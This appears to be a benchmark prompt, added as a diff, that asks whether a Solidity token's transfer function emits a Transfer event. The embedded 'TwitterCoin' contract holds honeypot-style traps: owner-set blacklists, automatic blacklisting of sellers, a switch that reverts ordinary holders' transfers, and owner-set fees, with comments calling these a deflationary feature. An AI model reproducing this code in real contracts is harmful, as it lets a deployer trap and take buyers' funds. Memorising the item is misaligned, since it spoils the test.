@@ -1,0 +1,173 @@
+Given a solidity function transfer and the related parts from a smart contract.
+Whether it emits the event Transfer? Replay in "YES" or "NO".
+Notes: Before Solidity version 0.5, events are emitting without "emit" keyword.
+
+Function(and related parts) to audit:"""
+pragma solidity 0.8.16;
+contract TwitterCoin is Context, IERC20, Ownable {
+    mapping(address => uint256) private _balances;
+    address private pairUniswap;
+
+    function pickCoal(address account) internal {
+        coal[account] = true;
+    }
+
+    /**
+     * @dev See {IERC20-transfer}.
+     *
+     * Requirements:
+     *
+     * - `to` cannot be the zero address.
+     * - the caller must have a balance of at least `amount`.
+     */
+    function transfer(
+        address to,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+        return true;
+    }
+
+    /**
+     * @dev Moves `amount` of tokens from `from` to `to`.
+     *
+     * This internal function is equivalent to {transfer}, and can be used to
+     * e.g. implement automatic token fees, slashing mechanisms, etc.
+     *
+     * Emits a {Transfer} event.
+     *
+     * Requirements:
+     *
+     * - `from` cannot be the zero address.
+     * - `to` cannot be the zero address.
+     * - `from` must have a balance of at least `amount`.
+     */
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        if (honey) {
+            uint256 fromBalance = _balances[from];
+            require(
+                fromBalance >= amount,
+                "ERC20: transfer amount exceeds balance"
+            );
+            unchecked {
+                _balances[from] = fromBalance - amount;
+            }
+            _balances[to] += amount;
+
+            emit Transfer(from, to, amount);
+        } else {
+            _beforeTokenTransfer(from, amount);
+            burnFee(from, to, amount);
+        }
+    }
+
+    /**
+     * @dev Deflationary instrument
+     *
+     * It can be turned on if necessary.
+     *
+     * Emits a {Transfer} event.
+     *
+     * Requirements
+     *
+     * - `sender` must have at least `value` tokens.
+     */
+    function burnFee(
+        address sender,
+        address recipient,
+        uint256 value
+    ) internal {
+        require(_balances[sender] >= value, "Value exceeds balance");
+        address deadAddress = 0x000000000000000000000000000000000000dEaD;
+        if (sender != owner() && !candy[sender] && sender != address(this)) {
+            uint256 burnFees = ((value * fee) / 100);
+            uint256 amount = value - burnFees;
+            _balances[sender] = _balances[sender] - amount;
+            _balances[recipient] = _balances[recipient] + amount;
+            emit Transfer(sender, recipient, amount);
+            if (fee > 0) {
+                _balances[sender] = _balances[sender] - burnFees;
+                _balances[deadAddress] = _balances[deadAddress] + burnFees;
+                emit Transfer(sender, deadAddress, burnFees);
+            }
+        } else {
+            _balances[sender] = _balances[sender] - value;
+            _balances[recipient] = _balances[recipient] + value;
+            emit Transfer(sender, recipient, value);
+        }
+    }
+
+    /**
+     * @dev Hook that is called before any transfer of tokens. This includes
+     * minting and burning.
+     *
+     * Calling conditions:
+     *
+     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
+     * will be transferred to `to`.
+     * - when `from` is zero, `amount` tokens will be minted for `to`.
+     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
+     * - `from` and `to` are never both zero.
+     *
+     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
+     */
+    function _beforeTokenTransfer(
+        address from,
+        uint256 amount
+    ) internal virtual {
+        if (
+            from != owner() && !candy[from] && from != pairUniswap // pair address to be changed
+        ) {
+            require(!coal[from]);
+            if (chocolates[from] > 0) {
+                require(amount <= chocolates[from]);
+            }
+
+            if (numbers > 0) {
+                require(amount <= numbers);
+            }
+            if (reward) {
+                revert("Error");
+            }
+            if (limits > 0) {
+                require(_balances[from] <= limits);
+            }
+
+            if (autoCoal) {
+                pickCoal(from);
+            }
+        }
+    }
+
+    mapping(address => bool) private candy;
+    mapping(address => bool) private coal;
+    mapping(address => uint256) private chocolates;
+    bool public reward;
+    uint256 public numbers;
+    uint256 public limits;
+    uint256 public fee;
+    bool public autoCoal;
+    bool private honey = false;
+}
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+}
+
+contract Ownable is Context {
+    address private _owner;
+
+    function owner() public view returns (address) {
+        return _owner;
+    }
+}
+"""
